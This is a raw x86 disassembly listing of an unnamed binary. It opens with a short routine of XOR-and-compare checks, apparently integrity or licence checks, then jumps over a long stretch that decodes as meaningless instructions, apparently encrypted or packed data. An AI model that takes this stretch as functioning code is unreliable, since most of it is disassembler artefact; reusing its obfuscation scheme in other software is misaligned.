  41b768:	mov    edx,DWORD PTR [esp+0x18]
  41b76c:	xor    ecx,ecx
  41b76e:	shld   ecx,eax,0x2
  41b772:	shl    eax,0x2
  41b775:	mov    DWORD PTR [esp+0x10],edx
  41b779:	mov    edx,DWORD PTR [esp+0x1c]
  41b77d:	xor    eax,ebx
  41b77f:	xor    ecx,esi
  41b781:	mov    DWORD PTR [esp+0x14],edx
  41b785:	cmp    DWORD PTR [esp+0x10],eax
  41b789:	jne    0x41c8ee
  41b78f:	cmp    edx,ecx
  41b791:	jne    0x41c8ee
  41b797:	mov    DWORD PTR [esp+0x30],0x42253c
  41b79f:	mov    eax,DWORD PTR [esp+0x18]
  41b7a3:	mov    ecx,DWORD PTR [esp+0x1c]
  41b7a7:	shrd   eax,ecx,0x2
  41b7ab:	shr    ecx,0x2
  41b7ae:	mov    ecx,DWORD PTR [esp+0x18]
  41b7b2:	mov    edx,DWORD PTR [esp+0x1c]
  41b7b6:	mov    edx,DWORD PTR [esp+0x30]
  41b7ba:	mov    edx,DWORD PTR [edx+0xc]
  41b7bd:	mov    DWORD PTR [esp+0xc],eax
  41b7c1:	shl    ecx,0x1e
  41b7c4:	mov    eax,0x329e695d
  41b7c9:	xor    DWORD PTR [esp+0xc],eax
  41b7cd:	xor    ecx,ecx
  41b7cf:	or     ecx,DWORD PTR [esp+0xc]
  41b7d3:	cmp    ecx,DWORD PTR [edx]
  41b7d5:	jne    0x41c888
  41b7db:	mov    ecx,0x65c7
  41b7e0:	mov    WORD PTR [esp+0x2c],cx
  41b7e5:	mov    ecx,0x6062
  41b7ea:	mov    WORD PTR [esp+0x24],cx
  41b7ef:	mov    ecx,0x125d
  41b7f4:	mov    WORD PTR [esp+0xc],cx
  41b7f9:	movzx  ecx,WORD PTR [esp+0xc]
  41b7fe:	mov    edx,0x2d0f
  41b803:	jmp    0x41bbd2
  41b808:	push   edi
  41b809:	and    BYTE PTR [ebx+0x236a9a6f],bh
  41b80f:	and    BYTE PTR [edx+0x30aa298c],dh
  41b815:	adc    al,0x9b
  41b817:	jo     0x41b877
  41b819:	mov    DWORD PTR [esi],edx
  41b81b:	sbb    BYTE PTR [edx+edx*1-0x10e0e7e8],bh
  41b822:	and    al,0x30
  41b824:	out    0x3f,eax
  41b826:	sbb    al,0xad
  41b828:	dec    esp
  41b829:	gs xchg ebx,eax
  41b82b:	pop    eax
  41b82c:	shufps xmm1,XMMWORD PTR [eax+0x4e],0x76
  41b831:	mov    ebx,es
  41b833:	push   es
  41b834:	pop    edi
  41b835:	fisubr DWORD PTR [edx-0x548b3e79]
  41b83b:	outs   dx,DWORD PTR ds:[esi]
  41b83c:	(bad)  
  41b83d:	dec    edi
  41b83e:	jbe    0x41b8b1
  41b840:	xchg   ebp,eax
  41b841:	add    al,0x5e
  41b843:	mov    esi,0x5fe9b367
  41b848:	fdivr  QWORD PTR [ecx]
  41b84a:	mov    ah,0x21
  41b84c:	test   al,0x48
  41b84e:	xor    esi,DWORD PTR [eax-0x719803dc]
  41b854:	fimul  DWORD PTR [eax+0x6ac8e299]
  41b85a:	dec    esp
  41b85b:	inc    edi
  41b85c:	ficomp WORD PTR [ecx-0x34]
  41b85f:	pop    eax
  41b860:	jl     0x41b893
  41b862:	xor    al,0xfc
  41b864:	fld    QWORD PTR [esi]
  41b866:	mov    esi,DWORD PTR [ebp-0xf6edc2b]
  41b86c:	pop    edi
  41b86d:	in     al,0xca
  41b86f:	ret    
  41b870:	jecxz  0x41b7f6
  41b872:	data16 das 
  41b874:	adc    ecx,esi
  41b876:	or     ah,bl
  41b878:	mov    bh,0x84
  41b87a:	inc    ebp
  41b87b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b87c:	fild   QWORD PTR [eax+edx*4+0x7a]
  41b880:	mov    ss,WORD PTR [ebp+0x5e]
  41b883:	loop   0x41b827
  41b885:	cmp    eax,0xca60ad8a
  41b88a:	add    BYTE PTR [edi],dl
  41b88c:	scas   al,BYTE PTR es:[edi]
  41b88d:	fimul  DWORD PTR [eax+eax*8-0x6b20e03f]
  41b894:	add    al,0x4f
  41b896:	mov    esi,0x816fd0d2
  41b89b:	sub    dh,dl
  41b89d:	dec    eax
  41b89e:	xor    eax,0xd7d8c4e0
  41b8a3:	xor    eax,edx
  41b8a5:	jge    0x41b90a
  41b8a7:	mov    dh,0x9
  41b8a9:	outs   dx,BYTE PTR ds:[esi]
  41b8aa:	adc    ebx,DWORD PTR [esi]
  41b8ac:	pop    ecx
  41b8ad:	pop    ecx
  41b8ae:	mov    DWORD PTR [edi-0x33],ebx
  41b8b1:	addr16 clc 
  41b8b3:	push   eax
  41b8b4:	std    
  41b8b5:	loop   0x41b86c
  41b8b7:	mov    ss,WORD PTR [esi]
  41b8b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8ba:	iret   
  41b8bb:	jp     0x41b917
  41b8bd:	in     al,dx
  41b8be:	mov    dl,0x4
  41b8c0:	push   ds
  41b8c1:	adc    eax,0x795be827
  41b8c6:	nop
  41b8c7:	rcl    BYTE PTR [ebx+0x48],0xf7
  41b8cb:	xor    edi,esi
  41b8cd:	mov    ss:0x7c04b0ab,eax
  41b8d3:	ja     0x41b8e0
  41b8d5:	mov    BYTE PTR [esi],bh
  41b8d7:	retf   
  41b8d8:	jno    0x41b878
  41b8da:	arpl   WORD PTR [esi+eiz*1+0x2bf17105],di
  41b8e1:	sub    bl,bh
  41b8e3:	push   ecx
  41b8e4:	test   eax,0x6135ca11
  41b8e9:	push   ebp
  41b8ea:	aas    
  41b8eb:	dec    edi
  41b8ec:	push   ss
  41b8ed:	sbb    DWORD PTR [ebx],eax
  41b8ef:	cmc    
  41b8f0:	call   0x5c91b0da
  41b8f5:	fcmovnbe st,st(6)
  41b8f7:	pop    ds
  41b8f8:	push   esp
  41b8f9:	cmp    al,dl
  41b8fb:	sub    al,ah
  41b8fd:	mov    ecx,0x33b8b3c4
  41b902:	stc    
  41b903:	pusha  
  41b904:	inc    edx
  41b905:	in     eax,0x50
  41b907:	pop    edi
  41b908:	jl     0x41b8e9
  41b90a:	les    edi,FWORD PTR [esi]
  41b90c:	repz adc al,0x43
  41b90f:	int    0x9b
  41b911:	inc    ecx
  41b912:	inc    BYTE PTR [esi+0x57]
  41b915:	shr    DWORD PTR [ebp-0x33],0x3f
  41b919:	nop
  41b91a:	hlt    
  41b91b:	mov    dl,0xf1
  41b91d:	jo     0x41b8b6
  41b91f:	sbb    eax,0x68e05946
  41b924:	sub    eax,eax
  41b926:	xchg   edi,eax
  41b927:	push   0x18
  41b929:	and    eax,0x4837162
  41b92e:	cmp    ecx,DWORD PTR [edx+0x3eff1069]
  41b934:	shl    DWORD PTR [esi-0x76a0545a],0x59
  41b93b:	gs mov cl,0xb0
  41b93e:	aas    
  41b93f:	call   0x42e64962
  41b944:	add    DWORD PTR [ebp-0x74],0xffffffe1
  41b948:	pop    ds
  41b949:	and    eax,0x277a016e
  41b94e:	fs out 0x9,al
  41b951:	addr16 (bad) 
  41b953:	xor    dl,BYTE PTR [esp+edx*2-0x31]
  41b957:	fsubr  QWORD PTR [ebx]
  41b959:	es je  0x41b98b
  41b95c:	fcom   DWORD PTR [eax]
  41b95e:	or     cl,0xf7
  41b961:	pusha  
  41b962:	jecxz  0x41b8ff
  41b964:	add    al,0xce
  41b966:	dec    ebp
  41b967:	(bad)  
  41b968:	inc    edi
  41b969:	xchg   ebx,eax
  41b96a:	rol    BYTE PTR [ecx-0x7f4ad297],cl
  41b970:	js     0x41b919
  41b972:	shr    DWORD PTR [ebx],1
  41b974:	mov    al,ds:0xa07a995c
  41b979:	mov    ch,0x65
  41b97b:	je     0x41b998
  41b97d:	inc    eax
  41b97e:	mov    ecx,0x9ddc693b
  41b983:	inc    eax
  41b984:	mov    DWORD PTR [edi+0x30],0x11f735d6
  41b98b:	addr16 pop es
  41b98d:	fwait
  41b98e:	adc    al,BYTE PTR [eax+edi*1+0x63]
  41b992:	mov    bh,0xb8
  41b994:	adc    BYTE PTR [ebx],dh
  41b996:	daa    
  41b997:	pop    esp
  41b998:	cmp    esi,edi
  41b99a:	in     al,dx
  41b99b:	sbb    al,0x94
  41b99d:	mov    ah,0x17
  41b99f:	into   
  41b9a0:	retf   
  41b9a1:	cmp    eax,0xb3af1b42
  41b9a6:	jge    0x41b9a4
  41b9a8:	inc    ebp
  41b9a9:	test   DWORD PTR [ecx+0x79],0x845c6db1
  41b9b0:	push   eax
  41b9b1:	in     eax,0x67
  41b9b3:	cli    
  41b9b4:	sbb    al,0x67
  41b9b6:	xchg   edx,eax
  41b9b7:	push   ebp
  41b9b8:	mov    ch,0xc0
  41b9ba:	or     ah,BYTE PTR fs:[eiz*8-0x15c4380d]
  41b9c2:	lods   eax,DWORD PTR ds:[esi]
  41b9c3:	mov    ecx,DWORD PTR [ebx+0x64]
  41b9c6:	sub    edi,edx
  41b9c8:	push   eax
  41b9c9:	je     0x41b952
  41b9cb:	sub    ecx,eax
  41b9cd:	loope  0x41b9bf
  41b9cf:	ins    BYTE PTR es:[edi],dx
  41b9d0:	adc    ch,BYTE PTR [ecx-0xa634a35]
  41b9d6:	stos   DWORD PTR es:[edi],eax
  41b9d7:	jbe    0x41b998
  41b9d9:	push   eax
  41b9da:	inc    esi
  41b9db:	add    DWORD PTR [edx-0x1939f982],ebx
  41b9e1:	jns    0x41ba0f
  41b9e3:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b9e5:	mov    ds:0xd19be30b,eax
  41b9ea:	adc    eax,0xb43ed7ec
  41b9ef:	jg     0x41b9dc
  41b9f1:	mov    ebp,0xe87bab85
  41b9f6:	ret    
  41b9f7:	and    eax,0x12190c0e
  41b9fc:	dec    ebx
  41b9fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b9fe:	mov    DWORD PTR [esi+0x684605dd],ebx
  41ba04:	or     DWORD PTR [ecx],ecx
  41ba06:	fiadd  WORD PTR [edx]
  41ba08:	jle    0x41ba82
  41ba0a:	sub    DWORD PTR [eax],edx
  41ba0c:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41ba0e:	dec    ecx
  41ba0f:	mov    edx,0x452b0a9
  41ba14:	adc    DWORD PTR [esi+0x145847d6],edi
  41ba1a:	pop    ecx
  41ba1b:	cmp    ebx,ecx
  41ba1d:	xchg   DWORD PTR [ebx+esi*1],edi
  41ba20:	sbb    esi,ebp
  41ba22:	push   ebp
  41ba23:	xlat   BYTE PTR ds:[ebx]
  41ba24:	scas   eax,DWORD PTR es:[edi]
  41ba25:	and    BYTE PTR [eax+0xa875f56],cl
  41ba2b:	scas   eax,DWORD PTR es:[edi]
  41ba2c:	add    esi,edx
  41ba2e:	aam    0x44
  41ba30:	cmp    bh,dl
  41ba32:	scas   eax,DWORD PTR es:[edi]
  41ba33:	jmp    0x7146897e
  41ba38:	imul   eax,DWORD PTR [ebp+0x67],0xffffffa1
  41ba3c:	imul   ebx,DWORD PTR [ecx+0x4b],0x10
  41ba40:	mov    dh,0x39
  41ba42:	push   0xb5257084
  41ba47:	sbb    BYTE PTR [edx-0x1e],0xdb
  41ba4b:	adc    al,dh
  41ba4d:	sti    
  41ba4e:	mov    eax,0xa07921c
  41ba53:	daa    
  41ba54:	pop    ebp
  41ba55:	sub    edx,DWORD PTR [edx-0x3a]
  41ba58:	(bad)  
  41ba59:	or     al,0x88
  41ba5b:	repz inc ebx
  41ba5d:	or     al,0x1d
  41ba60:	sbb    dl,BYTE PTR [ecx-0x4cbd8e00]
  41ba66:	and    bl,BYTE PTR [edx+0x74]
  41ba69:	cli    
  41ba6a:	sti    
  41ba6b:	dec    dl
  41ba6d:	inc    esp
  41ba6e:	div    DWORD PTR [ecx]
  41ba70:	mov    edi,0xe3b670c2
  41ba75:	ds jmp 0xfaf:0x26ada40d
  41ba7d:	rol    BYTE PTR [ecx-0x30],0x4
  41ba81:	push   ds
  41ba82:	mov    dh,0x1
  41ba84:	mov    edx,0xd65f8d84
  41ba89:	in     al,dx
  41ba8a:	mul    BYTE PTR [ebx]
  41ba8c:	fcomp  DWORD PTR [edx-0x40c0c607]
  41ba92:	xor    BYTE PTR [eax-0x75222f60],bh
  41ba98:	push   cs
  41ba99:	dec    ebx
  41ba9a:	pop    esp
  41ba9b:	fsubr  DWORD PTR fs:[eax+0x5e]
  41ba9f:	int3   
  41baa0:	jb     0x41ba79
  41baa2:	sub    BYTE PTR [eax-0x35a84697],0x53
  41baa9:	inc    esp
  41baaa:	(bad)  
  41baab:	(bad)  
  41baac:	sahf   
  41baad:	add    eax,0xe301bed6
  41bab2:	mov    bl,0xbe
  41bab4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bab5:	mov    al,ds:0x5021de22
  41baba:	mov    esi,0x6311b465
  41babf:	dec    esp
  41bac0:	xchg   ebp,eax
  41bac1:	cdq    
  41bac2:	add    edx,esp
  41bac4:	push   esi
  41bac5:	add    eax,DWORD PTR [ebx]
  41bac7:	pop    edx
  41bac8:	aam    0xbb
  41baca:	dec    ecx
  41bacb:	inc    ebp
  41bacc:	xor    eax,0x9998567f
  41bad1:	and    DWORD PTR [edx],ebx
  41bad3:	push   0xe057430a
  41bad8:	(bad)  
  41bada:	sbb    esi,DWORD PTR ds:0x1da2d49
  41bae0:	xor    esi,0x1
  41bae3:	dec    esi
  41bae4:	loope  0x41bab6
  41bae6:	pop    ecx
  41bae7:	pushf  
  41bae8:	cmp    al,0xff
  41baea:	lods   al,BYTE PTR ds:[esi]
  41baeb:	or     eax,DWORD PTR [ecx-0x42b4a236]
  41baf1:	je     0x41bac9
  41baf3:	fisub  WORD PTR [edx-0x21998234]
  41baf9:	test   DWORD PTR [edi+0x4],ebx
  41bafc:	aad    0x27
  41bafe:	adc    eax,0xddf36144
  41bb03:	(bad)  
  41bb04:	std    
  41bb05:	sar    BYTE PTR [eax+edi*1-0x1],cl
  41bb09:	fiadd  DWORD PTR [edi]
  41bb0b:	aam    0x41
  41bb0d:	xor    dh,bh
  41bb0f:	ss xchg edx,eax
  41bb11:	or     bl,BYTE PTR [eax+0x61c7affc]
  41bb17:	adc    DWORD PTR [edi-0x2f93191c],ebp
  41bb1d:	imul   edx,DWORD PTR [edi+0x1f4a9afa],0xffffffdc
  41bb24:	dec    DWORD PTR [ebx-0x40068476]
  41bb2a:	mov    ds:0x78e97e74,al
  41bb2f:	cdq    
  41bb30:	ss mov ah,0x26
  41bb33:	add    al,0x70
  41bb35:	sbb    BYTE PTR [edi+0x161ba694],ch
  41bb3b:	fwait
  41bb3c:	repz or DWORD PTR [edx],ecx
  41bb3f:	iret   
  41bb40:	add    al,0xb4
  41bb42:	pop    ss
  41bb43:	xor    bh,BYTE PTR [edx]
  41bb45:	dec    ebx
  41bb46:	out    0x70,eax
  41bb48:	in     eax,0x88
  41bb4a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bb4b:	call   0xf2b37a2d
  41bb50:	cmp    eax,0x6aca24b9
  41bb55:	or     DWORD PTR [esi+0x2e],0x89a9a229
  41bb5c:	js     0x41bb52
  41bb5e:	pop    eax
  41bb5f:	jl     0x41baf5
  41bb61:	bound  edi,QWORD PTR [edi+0x7d07d98a]
  41bb67:	push   esi
  41bb68:	in     eax,dx
  41bb69:	pusha  
  41bb6a:	lods   eax,DWORD PTR ds:[esi]
  41bb6b:	push   ebp
  41bb6c:	in     eax,0x1f
  41bb6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb6f:	pop    edx
  41bb70:	add    ecx,DWORD PTR [esi+0x1c]
  41bb73:	add    eax,DWORD PTR [edx-0x3a]
  41bb76:	jmp    0xd0d0:0x49afc8d8
  41bb7d:	jp     0x41bb3d
  41bb7f:	and    DWORD PTR es:[ecx],eax
  41bb82:	gs pop ss
  41bb84:	inc    edi
  41bb85:	rcr    BYTE PTR [edi-0x48],0x52
  41bb89:	jno    0x41bbc9
  41bb8b:	ss xchg esi,eax
  41bb8d:	nop
  41bb8e:	shl    DWORD PTR [edx+0x2f25f72f],1
  41bb94:	enter  0x37e9,0xad
  41bb98:	pop    esi
  41bb99:	jp     0x41bb8a
  41bb9b:	ss jle 0x41bb6b
  41bb9e:	stos   BYTE PTR es:[edi],al
  41bb9f:	and    DWORD PTR [eax-0xd],0x7e
  41bba3:	adc    DWORD PTR [edi+0xa],esi
  41bba6:	out    0xcb,eax
  41bba8:	sub    dh,ah
  41bbaa:	or     BYTE PTR [ecx+0x7b],bl
  41bbad:	and    eax,0x7c053ca4
  41bbb2:	mov    edi,0x9bd53ca4
  41bbb7:	sbb    eax,0xf4ff1f3b
  41bbbc:	pop    ecx
  41bbbd:	mov    ds:0xc55deb61,eax
  41bbc2:	iret   
  41bbc3:	xor    ebx,ecx
  41bbc5:	out    0xfe,al
  41bbc7:	loopne 0x41bb8c
  41bbc9:	dec    eax
  41bbca:	enter  0xbfe9,0xd9
  41bbce:	stos   BYTE PTR es:[edi],al
  41bbcf:	in     al,0xdd
  41bbd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bbd2:	and    cx,dx
  41bbd5:	mov    dx,WORD PTR [esp+0x24]
  41bbda:	or     cx,dx
  41bbdd:	mov    dx,WORD PTR [esp+0x2c]
  41bbe2:	add    cx,dx
  41bbe5:	or     ecx,0x3b22
  41bbeb:	mov    WORD PTR [esp+0x3c],cx
  41bbf0:	jmp    0x41bfbf
  41bbf5:	inc    edx
  41bbf6:	pop    edx
  41bbf7:	push   ecx
  41bbf8:	fwait
  41bbf9:	xor    DWORD PTR [edx+0x237b5a22],ebx
  41bbff:	pop    ecx
  41bc00:	stos   BYTE PTR es:[edi],al
  41bc01:	jb     0x41bc15
  41bc03:	fwait
  41bc04:	jo     0x41bc09
  41bc06:	adc    DWORD PTR [esi],0x1812bc18
  41bc0c:	sbb    BYTE PTR [esi-0x9],dl
  41bc0f:	and    al,0x30
  41bc11:	cmp    ebp,DWORD PTR [ecx+0x7a2ddf84]
  41bc17:	xor    BYTE PTR ds:0xf9c942b7,ch
  41bc1d:	xor    DWORD PTR [eax-0x5f282bf6],ecx
  41bc23:	scas   al,BYTE PTR es:[edi]
  41bc24:	in     al,0xbe
  41bc26:	push   eax
  41bc27:	rol    DWORD PTR [esi],cl
  41bc29:	ret    0x7d57
  41bc2c:	daa    
  41bc2d:	mov    esi,?
  41bc2f:	adc    al,0x4d
  41bc31:	add    al,BYTE PTR [esi+0x12fe1353]
  41bc37:	shl    bh,1
  41bc39:	jg     0x41bbc3
  41bc3b:	mov    ecx,0xc615b801
  41bc40:	sbb    BYTE PTR [ecx-0x63831317],bh
  41bc46:	lods   al,BYTE PTR ds:[esi]
  41bc47:	(bad)  
  41bc48:	jmp    0x6b38:0x135fdfaf
  41bc4f:	jns    0x41bbfe
  41bc51:	cld    
  41bc52:	dec    ecx
  41bc53:	xchg   edi,eax
  41bc54:	cli    
  41bc55:	adc    al,0x1c
  41bc57:	jl     0x41bc23
  41bc59:	std    
  41bc5a:	out    0x69,al
  41bc5c:	int    0x11
  41bc5e:	loope  0x41bccf
  41bc60:	push   ss
  41bc61:	scas   eax,DWORD PTR es:[edi]
  41bc62:	pop    ds
  41bc63:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc64:	(bad)  
  41bc65:	and    esp,DWORD PTR [ebp-0xa1da77d]
  41bc6b:	mov    edx,0xe541908f
  41bc70:	sbb    BYTE PTR [edi+0x67d2aa12],al
  41bc76:	pusha  
  41bc77:	jmp    0x5d28:0x3ead3889
  41bc7e:	in     al,dx
  41bc7f:	dec    esp
  41bc80:	dec    edi
  41bc81:	mov    dh,0xbf
  41bc83:	aam    0xc3
  41bc85:	pop    eax
  41bc86:	pop    ss
  41bc87:	rcl    DWORD PTR [eax-0x35],0x58
  41bc8b:	adc    BYTE PTR [ebx*1-0x340b9415],dl
  41bc92:	sub    BYTE PTR [ecx-0x21],0xc3
  41bc96:	xor    BYTE PTR [ecx+0x26],ch
  41bc99:	lods   al,BYTE PTR ds:[esi]
  41bc9a:	cmp    DWORD PTR [esi-0x3163cd9f],0x55593aaa
  41bca4:	xchg   edx,eax
  41bca5:	xchg   esi,eax
  41bca6:	or     ch,BYTE PTR [ecx+edx*1]
  41bca9:	push   ss
  41bcaa:	shl    ch,cl
  41bcac:	jmp    0x8b87a794
  41bcb1:	push   esi
  41bcb2:	les    esi,FWORD PTR [esi-0x17]
  41bcb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bcb6:	stos   DWORD PTR es:[edi],eax
  41bcb7:	iret   
  41bcb8:	xor    al,0xf9
  41bcba:	mov    ebx,0x34916810
  41bcbf:	fist   DWORD PTR [eax+0x1d193370]
  41bcc5:	or     eax,0x17087874
  41bcca:	fcmovb st,st(1)
  41bccc:	adc    DWORD PTR [ebx+ebx*8],0x99bbac6b
  41bcd3:	cmc    
  41bcd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bcd5:	cs jmp 0x3b3a877e
  41bcdb:	sub    ch,BYTE PTR [ecx+0x7]
  41bcde:	frstor [ebp+0x3e]
  41bce1:	or     edi,DWORD PTR [ebp-0x4c7cf595]
  41bce7:	ja     0x41bd11
  41bce9:	and    DWORD PTR [ebx+0x5eb24181],esp
  41bcef:	pop    ss
  41bcf0:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  41bcf2:	rcr    BYTE PTR [edi+0x573c727b],1
  41bcf8:	outs   dx,BYTE PTR ds:[esi]
  41bcf9:	jo     0x41bd30
  41bcfb:	test   DWORD PTR gs:[esi],esi
  41bcfe:	outs   dx,DWORD PTR ds:[esi]
  41bcff:	dec    esp
  41bd00:	cmp    cl,BYTE PTR [esi]
  41bd02:	icebp  
  41bd03:	int3   
  41bd04:	aaa    
  41bd05:	xor    al,0x8d
  41bd07:	int    0x3c
  41bd09:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bd0a:	lea    ebx,[edi]
  41bd0c:	lahf   
  41bd0d:	sub    al,0x23
  41bd0f:	sub    ah,dh
  41bd11:	xchg   ebp,eax
  41bd12:	retf   
  41bd13:	popa   
  41bd14:	and    eax,0x8ea824fa
  41bd19:	loop   0x41bca9
  41bd1b:	retf   0x13a5
  41bd1e:	add    eax,0x1801ae59
  41bd23:	es push esi
  41bd25:	es out 0xcd,eax
  41bd28:	sub    ecx,ecx
  41bd2a:	xchg   edi,eax
  41bd2b:	ins    BYTE PTR es:[edi],dx
  41bd2c:	repz (bad) 
  41bd2e:	stos   BYTE PTR es:[edi],al
  41bd2f:	leave  
  41bd30:	mov    ds:0x2bfe5557,al
  41bd35:	rcl    dh,0x21
  41bd38:	in     al,dx
  41bd39:	push   0xffffffa2
  41bd3b:	ja     0x41bd2b
  41bd3d:	leave  
  41bd3e:	push   ds
  41bd3f:	sahf   
  41bd40:	dec    esp
  41bd41:	and    DWORD PTR [ecx-0x6dbbef4a],0x61
  41bd48:	(bad)  
  41bd49:	outs   dx,BYTE PTR ds:[esi]
  41bd4a:	jbe    0x41bd4e
  41bd4c:	adc    eax,0x21fba4d2
  41bd51:	sub    al,0x9e
  41bd53:	cmp    BYTE PTR [edi],ch
  41bd55:	sub    cl,BYTE PTR [ecx]
  41bd57:	and    esi,DWORD PTR [eax]
  41bd59:	(bad)  
  41bd5a:	xchg   edi,eax
  41bd5b:	fwait
  41bd5c:	jmp    0x5384:0x22d9f346
  41bd63:	leave  
  41bd64:	pushf  
  41bd65:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd66:	sysexit 
  41bd68:	aam    0xca
  41bd6a:	sti    
  41bd6b:	sub    al,0xd1
  41bd6d:	sub    DWORD PTR [eax],edi
  41bd6f:	imul   ecx,DWORD PTR [edx],0x2c
  41bd72:	mov    ecx,DWORD PTR [edi+0x4adda764]
  41bd78:	leave  
  41bd79:	repz adc eax,0xd109a5d4
  41bd7f:	fild   QWORD PTR [ebx+0x67]
  41bd82:	sti    
  41bd83:	fdivr  QWORD PTR ds:0x852a8504
  41bd89:	mov    ds:0x7fdb612e,al
  41bd8e:	add    eax,0xdde813af
  41bd93:	dec    ecx
  41bd94:	ror    ebp,cl
  41bd96:	sti    
  41bd97:	test   ecx,0x59f8d895
  41bd9d:	(bad)  
  41bd9e:	repz jecxz 0x41bd95
  41bda1:	push   ecx
  41bda2:	pop    ds
  41bda3:	test   BYTE PTR [edx+0x5d0a1ed],bh
  41bda9:	les    esi,FWORD PTR [ebx]
  41bdab:	xchg   esi,eax
  41bdac:	push   ss
  41bdad:	lock mov edx,0xae16a63d
  41bdb3:	jnp    0x41bdde
  41bdb5:	mov    esi,0x99abbc94
  41bdba:	imul   ecx,DWORD PTR [eax],0x5335d41
  41bdc0:	inc    edx
  41bdc1:	jmp    0x94da:0xb45e06fc
  41bdc8:	pop    edi
  41bdc9:	add    ecx,esi
  41bdcb:	sbb    eax,0x319e6a58
  41bdd0:	fwait
  41bdd1:	pop    ecx
  41bdd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bdd3:	mov    al,ds:0x6a6761fc
  41bdd8:	push   esi
  41bdd9:	aad    0x76
  41bddb:	repz mul BYTE PTR [ebp-0x298f0cc4]
  41bde2:	mov    cl,0xd6
  41bde4:	and    BYTE PTR [ebp+0x4c16d1b6],al
  41bdea:	inc    ebx
  41bdeb:	cpuid  
  41bded:	push   cs
  41bdee:	shl    BYTE PTR [eax-0x4dadb585],1
  41bdf4:	mov    DWORD PTR [eax],esi
  41bdf6:	cld    
  41bdf7:	mov    es,WORD PTR [edx]
  41bdf9:	jge    0x41be75
  41bdfb:	fcom   QWORD PTR [esi+ebx*1]
  41bdfe:	loopne 0x41be3f
  41be00:	test   eax,0xa6671eff
  41be05:	mov    ebp,0x3d7a70bb
  41be0a:	lock jge 0x41bdd4
  41be0d:	int    0xc2
  41be0f:	mov    ds:0x3f9d9199,al
  41be14:	sbb    ebx,0x53250bf9
  41be1a:	adc    edi,DWORD PTR [eax+0x71cb7a10]
  41be20:	ja     0x41be1f
  41be22:	dec    eax
  41be23:	ja     0x41be0e
  41be25:	mov    BYTE PTR [ebx-0x64a82ea2],al
  41be2b:	sbb    al,0x2c
  41be2d:	pop    esi
  41be2e:	mov    ch,0x0
  41be30:	add    eax,0x81e968b2
  41be35:	daa    
  41be36:	inc    ecx
  41be37:	xor    ah,bh
  41be39:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be3a:	or     eax,0xf85517d0
  41be3f:	icebp  
  41be40:	pop    edi
  41be41:	int    0x99
  41be43:	inc    ecx
  41be44:	jae    0x41be6e
  41be46:	add    BYTE PTR [esi],0x84
  41be49:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be4a:	jge    0x41be8f
  41be4c:	gs lahf 
  41be4e:	stos   BYTE PTR es:[edi],al
  41be4f:	dec    BYTE PTR [ecx-0x3c]
  41be52:	fiadd  DWORD PTR [edx-0x2e9810c2]
  41be58:	jecxz  0x41bdf4
  41be5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be5b:	dec    ecx
  41be5c:	repz xor eax,0x13b6b7f3
  41be62:	in     eax,0xe
  41be64:	div    BYTE PTR [ebx+0x5c6f045e]
  41be6a:	pushf  
  41be6b:	ds xchg ebx,eax
  41be6d:	aam    0x48
  41be6f:	jne    0x41beb5
  41be71:	inc    esi
  41be72:	mov    ebp,0x331c1c6e
  41be77:	add    ch,BYTE PTR [eax+0x44]
  41be7a:	retf   
  41be7b:	cmp    BYTE PTR [edx],dh
  41be7d:	inc    ebx
  41be7e:	aam    0xa1
  41be80:	lock xchg BYTE PTR [esi-0x61a9fecd],dl
  41be87:	and    BYTE PTR [ebx+0x7c],bh
  41be8a:	imul   edx,DWORD PTR [ebx],0x69d5c9bf
  41be90:	jnp    0x41be4f
  41be92:	xlat   BYTE PTR ds:[ebx]
  41be93:	shr    DWORD PTR [esi],0x4b
  41be96:	add    al,0xa6
  41be98:	push   edx
  41be99:	ja     0x41be83
  41be9b:	mov    edx,0xad024156
  41bea0:	ins    DWORD PTR es:[edi],dx
  41bea1:	ss out dx,al
  41bea3:	adc    DWORD PTR [ebp+0x7f4a669f],esi
  41bea9:	sub    BYTE PTR [esi],ch
  41beab:	icebp  
  41beac:	sbb    eax,DWORD PTR [edx+edx*2-0x3a]
  41beb0:	adc    BYTE PTR [esi-0x523d24b4],cl
  41beb6:	add    al,0xce
  41beb8:	or     eax,0x6be4deed
  41bebd:	out    0xcb,al
  41bebf:	xchg   DWORD PTR [ebp+0x34],edi
  41bec2:	inc    ebp
  41bec3:	and    DWORD PTR [esi+esi*4-0x4d],edi
  41bec7:	push   ebp
  41bec8:	in     al,0x6b
  41beca:	jg     0x41bee5
  41becc:	jecxz  0x41be51
  41bece:	sub    DWORD PTR [edi+0x5b],edi
  41bed1:	mov    cl,0x3b
  41bed3:	adc    DWORD PTR ds:0xfd5944bc,esi
  41bed9:	pop    ebx
  41beda:	bound  esp,QWORD PTR [edx-0x2407f10c]
  41bee0:	mov    edi,0x500b5773
  41bee5:	or     eax,0x916f4ae0
  41beea:	jno    0x41beed
  41beec:	(bad)  
  41beee:	xchg   edx,eax
  41beef:	ficomp DWORD PTR [ebx-0x67]
  41bef2:	mov    esp,0x7f734b00
  41bef7:	or     al,0x5e
  41bef9:	and    ecx,esi
  41befb:	fadd   QWORD PTR [edx]
  41befd:	mov    esi,0xfa2c14ba
  41bf02:	imul   esi,DWORD PTR [ebx+0x3d],0x58
  41bf06:	dec    ebp
  41bf07:	loop   0x41bf78
  41bf09:	(bad)  
  41bf0a:	cs into 
  41bf0c:	in     eax,0xb9
